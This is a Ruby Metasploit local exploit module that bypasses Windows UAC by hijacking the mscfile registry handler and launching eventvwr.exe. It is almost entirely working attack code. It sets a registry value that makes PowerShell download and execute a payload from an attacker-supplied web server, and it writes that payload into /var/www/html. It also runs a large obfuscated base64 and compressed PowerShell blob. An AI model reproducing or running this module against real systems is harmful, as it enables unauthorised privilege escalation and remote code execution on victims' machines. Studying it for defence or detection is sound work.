##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Runas
  include Post::Windows::Registry
  include Post::Windows::Powershell


  def initialize(info={})
    super( update_info(info,
      'Name'          => 'Windows Escalate UAC Protection Bypass with Fileless',
      'Description'   => %q{
        This module will bypass Windows UAC by utilizing eventvwr.exe and hijacking entries registry on Windows.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Matt Graeber',
		'Enigma0x3',
        'Pablo Gonzalez' # Port to local exploit
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'URL', 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/' ],['URL','http://www.elladodelmal.com/2016/08/como-ownear-windows-7-y-windows-10-con.html'],
      ],
      'DisclosureDate'=> "Aug 15 2016"
    ))

    register_options([
      OptString.new('FILE_DYNAMIC_PAYLOAD',[true,'Payload PSH Encoded will be generated here (Not include webserver path)']),
      OptString.new('IPHOST',[true,'IP WebServer where File Payload will be downloaded']),
      OptBool.new('LOCAL',[true,'File Payload is in this machine?',true] ),			
    ])

  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end

  def exploit
    validate_environment!

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP, UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP, UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
        "UAC is set to 'Always Notify'. This module does not bypass this setting, exiting..."
      )
    when UAC_DEFAULT
      print_good 'UAC is set to Default'
      print_good 'BypassUAC can bypass this setting, continuing...'
    when UAC_NO_PROMPT
      print_warning "UAC set to DoNotPrompt - using ShellExecute 'runas' method instead"
      runas_method
      return
    end

    keys = registry_enumkeys('HKCU\Software\Classes\mscfile\shell\open\command')

    if keys == nil
	print_good("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command not exist!")
    end    

    key = registry_createkey('HKCU\Software\Classes\mscfile\shell\open\command')  
    reg = "IEX (New-Object Net.WebClient).DownloadString(\'http://#{datastore['IPHOST']}/#{datastore['FILE_DYNAMIC_PAYLOAD']}\')"

    command = cmd_psh_payload(payload.encoded, 'x86',{:remove_comspec => true,:encode_final_payload => true})
    if datastore['LOCAL']
        if File.exists?("/var/www/html/#{datastore['FILE_DYNAMIC_PAYLOAD']}")
	   File.delete("/var/www/html/#{datastore['FILE_DYNAMIC_PAYLOAD']}")
	end
	file_local_write("/var/www/html/#{datastore['FILE_DYNAMIC_PAYLOAD']}",command)
    end

    result = registry_setvaldata('HKCU\Software\Classes\mscfile\shell\open\command','bypass','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C ' + reg,'REG_SZ')
    if result
	execute_script("cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcANwBiADAASABZAEIAeABKAGwAaQBVAG0ATAAyADMASwBlADMAOQBLADkAVQByAFgANABIAFMAaABDAEkAQgBnAEUAeQBUAFkAawBFAEEAUQA3AE0ARwBJAHoAZQBhAFMANwBCADEAcABSAHkATQBwAHEAeQBxAEIAeQBtAFYAVwBaAFYAMQBtAEYAawBEAE0ANwBaADIAOAA5ADkANQA3ADcANwAzADMAMwBuAHYAdgB2AGYAZQA2AE8ANQAxAE8ASgAvAGYAZgAvAHoAOQBjAFoAbQBRAEIAYgBQAGIATwBTAHQAcgBKAG4AaQBHAEEAcQBzAGcAZgBQADMANQA4AEgAegA4AGkALwBxAC8ALwArADkAZgA0ADMAWAA2AE4AKwB0AGQAWQAvAHgAcgB0AHIANQBIADkARwB1AG0AdgA4AFIAbgA5AC8ANgBOAGYANAA5AHUALwB4AHUALwAxAGEANQB6ADgARwBsAC8AOQBHAG8AOQArAGoAZAAvADMAMQAzAGoAOQBhADEAUwAvAHgAagBsADkAZQAwAFgAZgAxADcAOQBHAFQAcAArAGMALwBCAG8AbAAvAGQANwBRAGYAegBuADkALwAvAGYAOQBOAFIAYgAwADcANQBUAGEARgBQAFEANQB2AG0AOQArAGoAVABuADkATABPAG0ALwAzADUAZgBlAFgAZABIAHYAUwAvAHAAdABTAHIAOAB2ADYATAArAE0ALwBwAHAAUgBIADcALwB4AHIANQBGAFEAegB4AFgAQgBuAEgARQBMADYAWAB2AHIAMQAvAGkAYwAvAG0AcAAvAGoAZQAxAGYANAA0AHoAKwB6AGEAbgA5AFMAMgBvAGgAVQBHAHIANgA1AEoAcgBhAGIATgBOAG4ARwBmADAAKwBwADkAOQA5ADMATABkAC8AagBSAGYAMABjADAARQB0ADAAMQAvAGoANAAxADkAagBRAG0AMQBYAGkAdQBmAEgAdgA4AGEAZABYADIATQBjAGYASQBMAGUAWAAxAEQATABLADYAKwBuAEwAcgBSAG4AagBOADIAVQA0AGYAMABNAC8AYgAvAGIAUABvAGEAWgBqADgASABXAHIALwBHAFUAZgBqAHUAbgBUADkAWgBFAGkANQBaAHcAKwBKAGoAYgAvAEMAUgA5AFUAdABKAG4ATwBmAGYAbwBVADIAQwA3AEIALwBNAE4ANAA0AHkAVwBEAGYAMQBkAEUANAAyAFgAdgA4AFoARgBGAEwAcwB2AEcAWABOAGcAZwBOADcASwAvAHcAYwA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=")
	print_good('Created registry entries to hijack!')
    end

    r = session.sys.process.execute("cmd.exe /c c:\\windows\\system32\\eventvwr.exe",nil,{'Hidden' => true, 'Channelized' => true})
    check_permissions!

  end

  def validate_environment!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? or is_system?

    winver = sysinfo['OS']

    unless winver =~ /Windows Vista|Windows 2008|Windows [78]/
      fail_with(Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status 'UAC is Enabled, checking level...'
    else
      if is_in_admin_group?
        fail_with(Failure::Unknown, 'UAC is disabled and we are in the admin group so something has gone wrong...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end
  end
end
